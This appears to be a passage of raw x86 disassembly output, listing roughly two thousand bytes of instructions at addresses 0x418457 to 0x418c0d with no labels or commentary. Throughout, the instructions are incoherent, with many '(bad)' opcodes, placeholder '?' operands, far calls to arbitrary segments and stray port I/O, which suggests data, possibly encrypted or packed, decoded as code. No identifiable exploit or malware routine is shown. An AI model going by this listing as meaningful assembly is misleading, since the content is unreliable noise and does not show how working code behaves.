  418457:	sbb    DWORD PTR [ebp-0x43],esi
  41845a:	sbb    DWORD PTR [ebx+0x188ad8e2],ebp
  418460:	pop    ebp
  418461:	mov    ebx,0x9d91c03f
  418466:	and    al,0xf2
  418468:	repz js 0x418441
  41846b:	inc    edi
  41846c:	or     bh,BYTE PTR [eax-0x29]
  41846f:	mov    bl,0x8c
  418471:	shr    esp,cl
  418473:	test   al,0x14
  418475:	call   0x9d51:0x371f87d9
  41847c:	(bad)  
  41847d:	adc    BYTE PTR [edi-0x6ade0a9f],dh
  418483:	lea    esi,[ebp+0x3a5db6e5]
  418489:	jecxz  0x418444
  41848b:	outs   dx,BYTE PTR ds:[esi]
  41848c:	gs xchg ebx,eax
  41848e:	popa   
  41848f:	sub    eax,0xc70ddd97
  418494:	dec    eax
  418495:	shl    BYTE PTR [ecx+0x38fe762f],cl
  41849b:	dec    ebx
  41849c:	mov    cl,0x6b
  41849e:	fidiv  WORD PTR [edi]
  4184a0:	xchg   BYTE PTR [edx-0x62a05ee5],bl
  4184a6:	sub    al,0x94
  4184a8:	push   esi
  4184a9:	in     eax,0x52
  4184ab:	jo     0x418459
  4184ad:	or     eax,0x9d51d8c5
  4184b2:	fbstp  TBYTE PTR [ecx+0x1a]
  4184b5:	jne    0x418501
  4184b7:	sub    DWORD PTR [eiz*2-0x2ca9ccab],eax
  4184be:	mov    edx,0xe7257b76
  4184c3:	pop    es
  4184c4:	ret    0x21bb
  4184c7:	push   esi
  4184c8:	fwait
  4184c9:	push   0xffffffaa
  4184cb:	and    BYTE PTR [ebx+ebx*1+0x2c],ch
  4184cf:	xor    DWORD PTR [esp+ebx*2],0x10
  4184d3:	ror    BYTE PTR [edx+edx*4+0x67caa240],0x51
  4184db:	cs jne 0x418536
  4184de:	loopne 0x4184c8
  4184e0:	fist   WORD PTR [edx+0x6f]
  4184e3:	sbb    BYTE PTR [ebp-0x22],cl
  4184e6:	icebp  
  4184e7:	es popa 
  4184e9:	push   ds
  4184ea:	out    dx,eax
  4184eb:	xlat   BYTE PTR ds:[ebx]
  4184ec:	outs   dx,BYTE PTR ds:[esi]
  4184ed:	push   eax
  4184ee:	mov    ah,0xb3
  4184f0:	call   0xe6598291
  4184f5:	test   esp,0x8c87e03e
  4184fb:	jp     0x418515
  4184fd:	jns    0x418488
  4184ff:	jp     0x4184bd
  418501:	popf   
  418502:	push   ebx
  418503:	cmp    dh,BYTE PTR [ebx-0x49]
  418506:	push   0x894798ea
  41850b:	or     edi,ebx
  41850d:	adc    BYTE PTR [edx-0x33],dh
  418510:	push   0xffffffae
  418512:	or     bh,ch
  418514:	call   0x9e5e:0x95fc399f
  41851b:	ds mov ah,0xf3
  41851e:	adc    cl,cl
  418520:	call   0x9924:0xedd92a85
  418527:	lock daa 
  418529:	sbb    dl,BYTE PTR [esi+eiz*8-0x62]
  41852d:	packssdw mm7,QWORD PTR [esi-0x325c3fd5]
  418534:	cwde   
  418535:	mov    dl,0x58
  418537:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  418539:	arpl   WORD PTR [edx-0x13],si
  41853c:	cdq    
  41853d:	daa    
  41853e:	imul   esp,DWORD PTR [ebp-0x48],0x1f
  418542:	shl    BYTE PTR [ecx+esi*4-0x66],cl
  418546:	cmp    edx,ebp
  418548:	dec    eax
  418549:	mov    al,ds:0x2f8580ca
  41854e:	clc    
  41854f:	pop    ss
  418550:	lods   eax,DWORD PTR ds:[esi]
  418551:	mov    al,ds:0x1ff54e27
  418556:	cdq    
  418557:	sub    DWORD PTR [esi+0x3185aaa8],esi
  41855d:	mov    BYTE PTR [esi],ch
  41855f:	add    BYTE PTR [esi],ch
  418561:	pop    ecx
  418562:	dec    ebx
  418563:	push   ebp
  418564:	dec    ebx
  418565:	inc    ebx
  418566:	inc    edi
  418567:	and    BYTE PTR [ecx],0xd2
  41856a:	mov    BYTE PTR ds:0x82ad1137,bh
  418570:	jb     0x41854b
  418572:	mov    dh,dh
  418574:	inc    ebp
  418575:	inc    edi
  418576:	mov    edi,0x678f6f43
  41857b:	sbb    eax,0xb738a3e3
  418580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418581:	xchg   ecx,eax
  418582:	rcr    DWORD PTR [ebx+ebp*8+0x4df1fb4c],cl
  418589:	sbb    DWORD PTR [edx-0x46],ecx
  41858c:	fimul  DWORD PTR [ebx-0x54320143]
  418592:	(bad)  
  418593:	mov    esp,DWORD PTR [ebx]
  418595:	std    
  418596:	lea    eax,[eax-0x56d00231]
  41859c:	ret    0x42b1
  41859f:	push   ebx
  4185a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185a1:	sahf   
  4185a2:	cmp    al,ah
  4185a4:	jno    0x418612
  4185a6:	jp     0x41860e
  4185a8:	aad    0xba
  4185aa:	xor    al,dl
  4185ac:	clc    
  4185ad:	cdq    
  4185ae:	or     eax,DWORD PTR [ecx]
  4185b0:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185b2:	rcr    BYTE PTR [esi-0x3c6f3484],1
  4185b8:	jle    0x418543
  4185ba:	adc    ch,0x17
  4185bd:	xlat   BYTE PTR ds:[ebx]
  4185be:	mov    ds:0x14789b14,eax
  4185c3:	addr16 adc eax,0x3a7bbb7b
  4185c9:	test   al,0x5c
  4185cb:	cmp    cl,BYTE PTR [ebp-0x2cdeb3a8]
  4185d1:	add    DWORD PTR [ebp+0x75],ebx
  4185d4:	scas   eax,DWORD PTR es:[edi]
  4185d5:	pop    eax
  4185d6:	sbb    al,0x51
  4185d8:	inc    eax
  4185d9:	xor    BYTE PTR [ecx-0x77],al
  4185dc:	sti    
  4185dd:	jno    0x4185b2
  4185df:	and    BYTE PTR [ebx+0x1d195dac],0xd1
  4185e6:	je     0x418597
  4185e8:	inc    ebp
  4185e9:	dec    edx
  4185ea:	fisubr DWORD PTR [eax-0x46]
  4185ed:	pop    ebx
  4185ee:	push   esp
  4185ef:	xchg   DWORD PTR [ebx+0x6a],eax
  4185f2:	ja     0x41857a
  4185f4:	jmp    0xe3b4ce02
  4185f9:	sub    al,al
  4185fb:	das    
  4185fc:	push   esp
  4185fd:	adc    BYTE PTR [edx+ecx*1],cl
  418600:	push   eax
  418601:	xor    ah,ah
  418603:	push   eax
  418604:	mov    edx,0x12b2ccf9
  418609:	xchg   ch,bl
  41860b:	stos   DWORD PTR es:[edi],eax
  41860c:	adc    eax,0x5aecd3b1
  418611:	mov    al,ds:0x4732c158
  418616:	adc    BYTE PTR [edx-0x50],0x7b
  41861a:	pop    eax
  41861b:	xlat   BYTE PTR ds:[ebx]
  41861c:	push   ss
  41861d:	pop    ss
  41861e:	stos   DWORD PTR es:[edi],eax
  41861f:	test   BYTE PTR [ecx-0x40],dl
  418622:	mov    ecx,0x1ff6c485
  418627:	ja     0x418651
  418629:	sar    ebx,1
  41862b:	jle    0x418664
  41862d:	aaa    
  41862e:	push   0xffffffb2
  418630:	push   cs
  418631:	sub    BYTE PTR [edi-0x1c],bh
  418634:	xchg   esi,eax
  418635:	jae    0x4185ca
  418637:	sub    dl,BYTE PTR [ecx+0xa]
  41863a:	and    eax,0x94ad1151
  41863f:	lock adc al,0x8a
  418642:	inc    esi
  418643:	mov    ecx,0x404331ac
  418648:	dec    edx
  418649:	pushf  
  41864a:	leave  
  41864b:	out    dx,al
  41864c:	dec    BYTE PTR [ecx]
  41864e:	xor    al,0xdf
  418650:	outs   dx,DWORD PTR ds:[esi]
  418651:	cmp    al,0x20
  418653:	add    ebp,DWORD PTR [ecx]
  418655:	mov    al,0x2f
  418657:	or     DWORD PTR [ecx-0x1ede7b54],ecx
  41865d:	cmc    
  41865e:	inc    eax
  41865f:	sub    eax,0xb240066e
  418664:	shl    BYTE PTR ds:0x849d69b3,0x88
  41866b:	adc    al,BYTE PTR [edx]
  41866d:	pop    ss
  41866e:	iret   
  41866f:	push   esp
  418670:	fisub  DWORD PTR [eax]
  418672:	sbb    eax,0xb24f195e
  418677:	and    al,0xc7
  418679:	adc    eax,0x6c717134
  41867e:	sbb    DWORD PTR ds:0x502c412a,ebp
  418684:	push   edx
  418685:	inc    esp
  418686:	outs   dx,BYTE PTR ds:[esi]
  418687:	mov    ebp,0xea2f621d
  41868c:	cwde   
  41868d:	ja     0x418631
  41868f:	into   
  418690:	cmp    BYTE PTR [ecx+0x6381f60d],0x63
  418697:	pop    es
  418698:	adc    eax,0x2862b58f
  41869d:	lock push 0x2c5c6749
  4186a3:	in     al,dx
  4186a4:	sbb    DWORD PTR [eax-0x6],0x79e345fb
  4186ab:	or     al,0x0
  4186ad:	cld    
  4186ae:	add    al,BYTE PTR [ebx+0x3f]
  4186b1:	and    ch,0xd3
  4186b4:	popf   
  4186b5:	or     DWORD PTR [esi+0x194c30d0],edx
  4186bb:	jo     0x41869c
  4186bd:	xchg   edi,eax
  4186be:	rcl    DWORD PTR [esi+0x15],1
  4186c1:	retf   
  4186c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c3:	add    DWORD PTR [ebp+0x65],0x36
  4186c7:	mov    ah,0x28
  4186c9:	(bad)  
  4186cb:	(bad)  [edx-0x2b9aeab0]
  4186d1:	pop    ebx
  4186d2:	ss test ah,dl
  4186d5:	or     bl,BYTE PTR ds:0xad1908ac
  4186db:	sub    eax,0x99e5458e
  4186e0:	repz sbb DWORD PTR fs:[ebx],esp
  4186e4:	fidivr WORD PTR [ecx]
  4186e6:	xor    BYTE PTR [ecx],0x57
  4186e9:	xor    BYTE PTR [ebp-0x7ede16ae],bh
  4186ef:	sbb    al,BYTE PTR [ebx-0x17]
  4186f2:	retf   
  4186f3:	and    BYTE PTR [ebx+0x4a],0x9b
  4186f7:	mov    ebp,0xeb987bd2
  4186fc:	adc    bl,ch
  4186fe:	scas   al,BYTE PTR es:[edi]
  4186ff:	arpl   dx,cx
  418701:	cmp    DWORD PTR [edi+0x8],ecx
  418704:	mov    ebx,0x4389b647
  418709:	scas   eax,DWORD PTR es:[edi]
  41870a:	jb     0x4186c2
  41870c:	enter  0xe136,0x2e
  418710:	cmp    eax,0xb7a9adef
  418715:	lods   eax,DWORD PTR ds:[esi]
  418716:	lahf   
  418717:	jbe    0x418757
  418719:	int    0xf9
  41871b:	xor    al,0x83
  41871d:	or     dl,al
  41871f:	cmp    BYTE PTR [eax+0x25],cl
  418722:	xchg   ebx,eax
  418723:	loop   0x41872a
  418725:	popa   
  418726:	and    BYTE PTR [edx],bl
  418728:	add    ebx,DWORD PTR [esi]
  41872a:	test   bh,bl
  41872c:	inc    ebx
  41872d:	sti    
  41872e:	jo     0x418733
  418730:	sub    al,0x56
  418732:	loopne 0x4186e5
  418734:	das    
  418735:	stc    
  418736:	push   DWORD PTR [edx+ebp*1+0x3e]
  41873a:	retf   0xe762
  41873d:	jbe    0x418701
  41873f:	fdivrp st(5),st
  418741:	rcr    DWORD PTR [esi],cl
  418743:	xchg   edi,eax
  418744:	jp     0x418792
  418746:	adc    al,0x47
  418748:	pop    ds
  418749:	sbb    al,0xf9
  41874b:	sahf   
  41874c:	lea    esp,[eax]
  41874e:	sub    dh,al
  418750:	dec    ebp
  418751:	or     DWORD PTR [esi],eax
  418753:	dec    ebp
  418754:	lds    ebp,FWORD PTR [eax]
  418756:	fcom   DWORD PTR [edx+0x4af92bd2]
  41875c:	push   edx
  41875d:	lock outs dx,DWORD PTR ds:[esi]
  41875f:	push   ds
  418760:	sbb    cl,BYTE PTR [esi+edx*8-0x5c35899d]
  418767:	or     al,0xf2
  418769:	daa    
  41876a:	fstp   QWORD PTR [ebx+0x4d]
  41876d:	call   0x34e1:0x256c4245
  418774:	cmp    BYTE PTR [edx],al
  418776:	push   ecx
  418777:	fwait
  418778:	pop    es
  418779:	sub    BYTE PTR [ecx+0x4c],0x72
  41877d:	popa   
  41877e:	pop    DWORD PTR [esi+0x1c2fa06b]
  418784:	fs out 0x99,eax
  418787:	dec    edi
  418788:	inc    edi
  418789:	loope  0x418792
  41878b:	imul   edi,DWORD PTR [ebx],0x61d75e4c
  418791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418792:	std    
  418793:	dec    edi
  418794:	mov    al,ds:0xe5d904ee
  418799:	sbb    ch,al
  41879b:	mov    BYTE PTR [esi+0x563b0e02],dh
  4187a1:	sbb    eax,0x2f260ebf
  4187a6:	sbb    cl,BYTE PTR [ecx-0x68db2429]
  4187ac:	(bad)  
  4187ad:	lods   al,BYTE PTR ds:[esi]
  4187ae:	mul    BYTE PTR [eax+0x9]
  4187b1:	test   BYTE PTR [ebx+0x43eecb09],cl
  4187b7:	scas   eax,DWORD PTR es:[edi]
  4187b8:	inc    esp
  4187b9:	fs popf 
  4187bb:	sub    esi,esp
  4187bd:	push   esp
  4187be:	cld    
  4187bf:	push   es
  4187c0:	fsubrp st(4),st
  4187c2:	xchg   ebx,eax
  4187c3:	(bad)  
  4187c4:	or     bh,ah
  4187c6:	sldt   WORD PTR [esi]
  4187c9:	mov    dh,0xb9
  4187cb:	cmp    BYTE PTR [ecx],bl
  4187cd:	mov    WORD PTR [ebp-0x72],?
  4187d0:	add    eax,0xc5bae7ba
  4187d5:	and    eax,0x827fcf6f
  4187da:	jae    0x4187c3
  4187dc:	add    ebx,DWORD PTR [ecx+ebp*1+0x4a]
  4187e0:	pop    edi
  4187e1:	push   cs
  4187e2:	sbb    esi,esp
  4187e4:	retf   
  4187e5:	cmp    eax,0x4dff9869
  4187ea:	inc    ebx
  4187eb:	ds xor eax,0xedc9a926
  4187f1:	test   eax,0x55c892eb
  4187f6:	and    DWORD PTR [ebx+0x7f],0x605fd026
  4187fd:	cld    
  4187fe:	mov    eax,ds:0xbee3cf68
  418803:	es inc edx
  418805:	pushf  
  418806:	mov    eax,0x48ecc21d
  41880b:	push   cs
  41880c:	loop   0x418848
  41880e:	push   edx
  41880f:	paddsw mm3,QWORD PTR [edi]
  418812:	(bad)  
  418813:	ficom  WORD PTR ds:[edx-0x5d]
  418817:	std    
  418818:	pushf  
  418819:	(bad)  [ecx]
  41881b:	mov    esi,DWORD PTR ds:0xad3df4ef
  418821:	and    bl,BYTE PTR [esp+eiz*4]
  418824:	fdivr  st(6),st
  418826:	rcl    al,cl
  418828:	repz scas al,BYTE PTR es:[edi]
  41882a:	lahf   
  41882b:	in     al,0x0
  41882d:	xchg   ah,dl
  41882f:	ja     0x41883a
  418831:	test   DWORD PTR [edx-0x2ef290a1],ebp
  418837:	jmp    0xfc277500
  41883c:	lods   al,BYTE PTR ds:[esi]
  41883d:	jns    0x418874
  41883f:	sub    ebp,ecx
  418841:	adc    eax,0x7f10bdac
  418846:	int    0x13
  418848:	mov    ah,0x58
  41884a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41884b:	in     eax,0x2d
  41884d:	int3   
  41884e:	mov    eax,ds:0x788830e3
  418853:	repz gs pop ds
  418856:	enter  0xba1c,0x41
  41885a:	pop    ebx
  41885b:	ss leave 
  41885d:	push   0x28
  41885f:	jl     0x418886
  418861:	(bad)  
  418862:	xor    eax,0x8112e73c
  418867:	mov    ch,al
  418869:	xchg   edi,eax
  41886a:	push   edx
  41886b:	in     eax,0xeb
  41886d:	(bad)  
  41886e:	jmp    0x17ca8a32
  418873:	call   0xfa72f181
  418878:	pop    ss
  418879:	push   edi
  41887a:	not    DWORD PTR [esi]
  41887c:	(bad)  
  41887d:	mov    edx,0xb0f9a1e0
  418882:	fwait
  418883:	retf   
  418884:	sub    eax,DWORD PTR [eax+0x20]
  418887:	loopne 0x418883
  418889:	in     al,0xcb
  41888b:	xor    ecx,DWORD PTR [eax+0x125d7e35]
  418891:	das    
  418892:	mov    eax,0x4ad32157
  418897:	and    eax,0xa84e706c
  41889c:	xor    dh,BYTE PTR [edx+edx*4+0x6638fc82]
  4188a3:	cli    
  4188a4:	xchg   esp,eax
  4188a5:	push   ss
  4188a6:	(bad)  
  4188a7:	cli    
  4188a8:	shl    DWORD PTR [esi-0x6a],1
  4188ab:	mov    ?,WORD PTR [ebp-0x15]
  4188ae:	and    ebp,ebp
  4188b0:	jns    0x4188c5
  4188b2:	pop    edx
  4188b3:	push   eax
  4188b4:	inc    edi
  4188b5:	push   eax
  4188b6:	mov    cs,WORD PTR [ebx]
  4188b8:	push   es
  4188b9:	enter  0x2d6e,0xd5
  4188bd:	call   0x635c6657
  4188c2:	inc    eax
  4188c3:	pop    esp
  4188c4:	div    BYTE PTR [edx]
  4188c6:	popa   
  4188c7:	inc    DWORD PTR [edi+esi*1+0x19]
  4188cb:	mov    dl,0xba
  4188cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188ce:	int3   
  4188cf:	es mov eax,0xfc91a987
  4188d5:	(bad)  
  4188d6:	or     esp,DWORD PTR [ebp+0x1488f9f]
  4188dc:	(bad)  
  4188dd:	repnz mov bh,0x8
  4188e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e1:	push   ebp
  4188e2:	cmp    ah,bl
  4188e4:	and    BYTE PTR [ebp+0xab6479f],al
  4188ea:	out    dx,eax
  4188eb:	ret    0xfb09
  4188ee:	mov    al,0x57
  4188f0:	dec    esi
  4188f1:	sahf   
  4188f2:	fimul  DWORD PTR [eax+0x2c]
  4188f5:	in     al,dx
  4188f6:	sub    ecx,DWORD PTR [esi+0x7027acca]
  4188fc:	loop   0x418967
  4188fe:	cmp    ch,BYTE PTR [ebx+0x57]
  418901:	scas   al,BYTE PTR es:[edi]
  418902:	adc    eax,0x7aceb2ff
  418907:	repz fs cmp DWORD PTR gs:[ebp-0x7b],ebp
  41890d:	not    DWORD PTR [eax]
  41890f:	fwait
  418910:	jl     0x41890e
  418912:	xor    edx,DWORD PTR [ecx-0x251731ab]
  418918:	xchg   ebx,eax
  418919:	retf   
  41891a:	lahf   
  41891b:	or     eax,0x77e62848
  418920:	inc    esp
  418921:	mov    ecx,esp
  418923:	xor    ch,ch
  418925:	add    dl,bl
  418927:	or     BYTE PTR [ecx],0x98
  41892a:	cld    
  41892b:	test   eax,0x4df75636
  418930:	imul   esi,DWORD PTR [edi+ebp*1+0x6363e540],0x71
  418938:	sbb    al,0x17
  41893a:	call   0x125e:0xc3672759
  418941:	jg     0x418965
  418943:	sbb    DWORD PTR cs:[ecx+eax*4+0x2125c28f],esp
  41894b:	(bad)  
  41894d:	call   0x6f5cc931
  418952:	mov    edx,0xa511204e
  418957:	mov    ch,0xc8
  418959:	mov    DWORD PTR [ebx+ebp*1],ebx
  41895c:	jge    0x418926
  41895e:	sbb    BYTE PTR [edx],ah
  418960:	add    DWORD PTR [edi+edi*2-0x32],esi
  418964:	in     al,0xf
  418966:	outs   dx,BYTE PTR ds:[esi]
  418967:	or     DWORD PTR [edx-0x22],ebx
  41896a:	aas    
  41896b:	xchg   edx,eax
  41896c:	cmp    al,0x55
  41896e:	mov    bl,0x9c
  418970:	call   0x609bb6f7
  418975:	out    0x83,al
  418977:	pop    ebp
  418978:	(bad)  [ebp-0x2dcb05fd]
  41897e:	inc    eax
  41897f:	mov    al,BYTE PTR [ebx-0x5c]
  418982:	xchg   ebx,eax
  418983:	xchg   ecx,eax
  418984:	add    al,0x82
  418986:	leave  
  418987:	sub    BYTE PTR [ecx+0x5],ah
  41898a:	test   eax,0xbfd623a5
  41898f:	call   FWORD PTR [esi+0x7a]
  418992:	les    ebp,FWORD PTR [eax]
  418994:	aas    
  418995:	mov    al,0x82
  418997:	outs   dx,BYTE PTR ds:[esi]
  418998:	into   
  418999:	xlat   BYTE PTR ds:[ebx]
  41899a:	and    eax,0x654e7966
  41899f:	cmp    al,0x88
  4189a1:	mov    esp,esi
  4189a3:	repnz push edi
  4189a5:	pop    ebp
  4189a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189a7:	xor    al,0xf2
  4189a9:	retf   0xd746
  4189ac:	xchg   esp,eax
  4189ad:	rcr    edi,1
  4189af:	mov    esi,0x6d5d7465
  4189b4:	adc    esp,edi
  4189b6:	lods   al,BYTE PTR ds:[esi]
  4189b7:	or     DWORD PTR [ebx+eax*8],0xffffffcd
  4189bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bc:	push   edx
  4189bd:	test   eax,0x7852a1db
  4189c2:	inc    ebp
  4189c3:	jp     0x4189f4
  4189c5:	lods   eax,DWORD PTR ds:[esi]
  4189c6:	mov    ds:0x4ffbf0dd,eax
  4189cb:	and    DWORD PTR [ecx],edi
  4189cd:	clc    
  4189ce:	mov    al,ds:0x8070715f
  4189d3:	popf   
  4189d4:	or     al,0x96
  4189d6:	and    al,0x2b
  4189d8:	push   ebx
  4189d9:	imul   DWORD PTR [ebx]
  4189db:	loop   0x4189a1
  4189dd:	or     eax,0x27866cff
  4189e2:	jp     0x418a51
  4189e4:	mov    esp,0x908f5114
  4189e9:	xchg   ebp,eax
  4189ea:	jmp    0x4f65bf49
  4189ef:	jmp    0x4189d8
  4189f1:	(bad)  
  4189f2:	mov    ah,0x2
  4189f4:	pop    ds
  4189f5:	test   dh,dh
  4189f7:	cmc    
  4189f8:	pop    esi
  4189f9:	add    ebx,DWORD PTR [eax+0x57]
  4189fc:	fnstsw WORD PTR [ebp-0x12]
  4189ff:	lds    ebx,FWORD PTR [esi]
  418a01:	pop    ecx
  418a02:	fwait
  418a03:	outs   dx,BYTE PTR ds:[esi]
  418a04:	pop    ds
  418a05:	test   eax,0x96366314
  418a0a:	sub    DWORD PTR [esp+esi*1],0x64
  418a0e:	scas   al,BYTE PTR es:[edi]
  418a0f:	in     eax,0x15
  418a11:	cmp    eax,0xbdf46648
  418a16:	mov    dh,BYTE PTR [esi]
  418a18:	scas   eax,DWORD PTR es:[edi]
  418a19:	test   BYTE PTR [ebp-0x17],bl
  418a1c:	fldenv [ecx]
  418a1e:	outs   dx,BYTE PTR ds:[esi]
  418a1f:	jne    0x4189a6
  418a21:	ins    BYTE PTR es:[edi],dx
  418a22:	xchg   edi,eax
  418a23:	sahf   
  418a24:	sub    BYTE PTR [esi+0x70],ch
  418a27:	retf   
  418a28:	mov    ch,0x26
  418a2a:	es and al,al
  418a2d:	sahf   
  418a2e:	out    0xa7,al
  418a30:	mov    ecx,0xb9d0cd8c
  418a35:	jbe    0x4189fb
  418a37:	or     al,0xfd
  418a39:	popa   
  418a3a:	jl     0x418aa8
  418a3c:	outs   dx,DWORD PTR ds:[esi]
  418a3d:	dec    esp
  418a3e:	fsubr  DWORD PTR [eax]
  418a40:	out    0xaf,al
  418a42:	jg     0x4189c9
  418a44:	pop    edx
  418a45:	mov    ebp,0x44f1d6fe
  418a4a:	dec    BYTE PTR [edx-0x2777ec78]
  418a50:	xor    DWORD PTR [esi-0x30],esp
  418a53:	pop    esi
  418a54:	xor    BYTE PTR [edx+0x1f],0x8
  418a58:	cmp    bl,bh
  418a5a:	push   esp
  418a5b:	xor    DWORD PTR [edx],0x55767bcf
  418a61:	sub    al,BYTE PTR [edx+0xe]
  418a64:	pop    ebx
  418a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a66:	fwait
  418a67:	xchg   esp,eax
  418a68:	mov    cs,WORD PTR [ebx-0x80]
  418a6b:	jo     0x418ab8
  418a6d:	fnstenv [ebx]
  418a6f:	mov    dl,0xa2
  418a71:	mov    eax,0xc8632347
  418a76:	cdq    
  418a77:	and    DWORD PTR [esi],edi
  418a79:	xchg   ecx,eax
  418a7a:	out    dx,al
  418a7b:	jecxz  0x418a71
  418a7d:	push   ss
  418a7e:	jo     0x418a7b
  418a80:	ins    BYTE PTR es:[edi],dx
  418a81:	inc    esp
  418a82:	sti    
  418a83:	retf   
  418a84:	mov    eax,0xbd04217f
  418a89:	push   eax
  418a8a:	mov    esp,0x39aec801
  418a8f:	push   esp
  418a90:	pop    esi
  418a91:	push   edx
  418a92:	jmp    0xb349b05d
  418a97:	pushf  
  418a98:	push   eax
  418a99:	(bad)  ds:0x3ae31402
  418a9f:	fwait
  418aa0:	xchg   ebx,eax
  418aa1:	out    dx,eax
  418aa2:	(bad)  
  418aa3:	aas    
  418aa4:	fnstenv [ebx+eax*1-0x1e]
  418aa8:	pop    esp
  418aa9:	ret    
  418aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aab:	or     DWORD PTR [ecx+eiz*4],eax
  418aae:	cli    
  418aaf:	mov    BYTE PTR [edx],dh
  418ab1:	inc    ebx
  418ab2:	shr    bh,1
  418ab4:	sub    dh,BYTE PTR [edi+0x617743c1]
  418aba:	cdq    
  418abb:	into   
  418abc:	xor    DWORD PTR [eax-0x4f0ba607],eax
  418ac2:	jbe    0x418a75
  418ac4:	pushf  
  418ac5:	mov    ds:0xe45f1601,al
  418aca:	or     al,0xfa
  418acc:	pop    edi
  418acd:	fadd   QWORD PTR [edi-0x27ed15ce]
  418ad3:	dec    ebp
  418ad4:	xchg   ebp,eax
  418ad5:	out    0xde,eax
  418ad7:	dec    eax
  418ad8:	scas   eax,DWORD PTR es:[edi]
  418ad9:	imul   esi,DWORD PTR [edx+0x29748118],0x62
  418ae0:	clc    
  418ae1:	sub    eax,0x7906c488
  418ae6:	pop    ebp
  418ae7:	add    DWORD PTR [esi-0x13],0xffffffa8
  418aeb:	ror    DWORD PTR [edi+edi*8],cl
  418aee:	sahf   
  418aef:	jne    0x418b0c
  418af1:	mov    al,ds:0x1990c4e1
  418af6:	retf   
  418af7:	push   es
  418af8:	push   ss
  418af9:	jne    0x418b33
  418afb:	and    dh,BYTE PTR [ebp+0x21ed22de]
  418b01:	cmp    eax,0xa7e3af38
  418b06:	mov    bh,0xd9
  418b08:	jbe    0x418aa8
  418b0a:	sahf   
  418b0b:	cmp    eax,0x3fad1932
  418b10:	ins    DWORD PTR es:[edi],dx
  418b11:	pop    ss
  418b12:	cmp    eax,0x807ea33e
  418b17:	dec    ebp
  418b18:	add    eax,0xa4b7fc5f
  418b1d:	or     esi,DWORD PTR [ebx+0x5a]
  418b20:	jecxz  0x418b2e
  418b22:	in     al,dx
  418b23:	push   eax
  418b24:	pusha  
  418b25:	ins    DWORD PTR es:[edi],dx
  418b26:	or     BYTE PTR [eax-0x475ee0a2],0x66
  418b2d:	sbb    ebx,DWORD PTR [ebx-0x44]
  418b30:	pop    esi
  418b31:	test   DWORD PTR [ebp-0x4f],0xf37dd7d8
  418b38:	add    bh,al
  418b3a:	jmp    DWORD PTR [edi]
  418b3c:	sti    
  418b3d:	inc    BYTE PTR [edx]
  418b3f:	sbb    eax,0xd3052c0e
  418b44:	xchg   esi,eax
  418b45:	popf   
  418b46:	ds imul ebx,ebx,0x5ddfaef6
  418b4d:	int3   
  418b4e:	ss dec esi
  418b50:	mov    eax,0xa1dfbf41
  418b55:	xor    BYTE PTR [ebp+ecx*8-0x28],al
  418b59:	pop    ebx
  418b5a:	aaa    
  418b5b:	cwde   
  418b5c:	loopne 0x418af2
  418b5e:	inc    eax
  418b5f:	pop    ebx
  418b60:	mov    cl,0xeb
  418b62:	stos   BYTE PTR es:[edi],al
  418b63:	hlt    
  418b64:	xor    cl,BYTE PTR [ebp+eiz*4-0x675543e3]
  418b6b:	pop    edx
  418b6c:	or     edx,DWORD PTR [edx-0x1a6f2997]
  418b72:	in     al,dx
  418b73:	dec    ebp
  418b74:	aaa    
  418b75:	jle    0x418ba6
  418b77:	dec    eax
  418b78:	fsubrp st(3),st
  418b7a:	test   DWORD PTR [eax],edx
  418b7c:	mov    eax,0x43db64a5
  418b81:	xchg   ebp,eax
  418b82:	jg     0x418bea
  418b84:	out    dx,eax
  418b85:	adc    esp,0x4d
  418b88:	out    dx,eax
  418b89:	rol    DWORD PTR [ecx],cl
  418b8b:	pop    edx
  418b8c:	sub    al,0x1
  418b8e:	xor    dh,BYTE PTR [edi+0x53]
  418b91:	jae    0x418bdf
  418b93:	leave  
  418b94:	loopne 0x418be6
  418b96:	int3   
  418b97:	jno    0x418b4e
  418b99:	je     0x418b32
  418b9b:	push   0x74108644
  418ba0:	ins    DWORD PTR es:[edi],dx
  418ba1:	sbb    ah,BYTE PTR [ebp-0x23d83576]
  418ba7:	retf   0x78c6
  418baa:	and    ah,bl
  418bac:	loop   0x418c10
  418bae:	das    
  418baf:	ret    
  418bb0:	mov    ch,0x54
  418bb2:	mov    eax,0x13a9207c
  418bb7:	jge    0x418b8e
  418bb9:	(bad)  
  418bba:	xchg   ebp,eax
  418bbb:	inc    ebx
  418bbc:	iret   
  418bbd:	sbb    esi,ebx
  418bbf:	pushf  
  418bc0:	scas   al,BYTE PTR es:[edi]
  418bc1:	push   esi
  418bc2:	out    dx,al
  418bc3:	fstp   QWORD PTR [eax]
  418bc5:	cmp    edi,esi
  418bc7:	push   ecx
  418bc8:	mov    eax,0xc1a13286
  418bcd:	out    0x14,eax
  418bcf:	sar    esi,cl
  418bd1:	dec    ebp
  418bd2:	sahf   
  418bd3:	pop    ebx
  418bd4:	push   edi
  418bd5:	mov    ebp,0x44d13797
  418bda:	dec    ebp
  418bdb:	popa   
  418bdc:	sub    ch,bl
  418bde:	mov    ch,0x69
  418be0:	outs   dx,DWORD PTR ds:[esi]
  418be1:	sub    DWORD PTR [ecx],0x5b09d3bc
  418be7:	cdq    
  418be8:	inc    BYTE PTR [ebp+0x24]
  418beb:	clc    
  418bec:	or     eax,0xcdd46f8a
  418bf1:	int3   
  418bf2:	jo     0x418bbb
  418bf4:	jbe    0x418b78
  418bf6:	push   ebp
  418bf7:	stos   DWORD PTR es:[edi],eax
  418bf8:	fstp   st(5)
  418bfa:	and    bh,BYTE PTR [ebp+0x798bef23]
  418c00:	mov    ebx,0x3d775f78
  418c05:	adc    DWORD PTR [edi-0xa],esp
  418c08:	mov    edx,0x71996726
  418c0d:	int    0x89
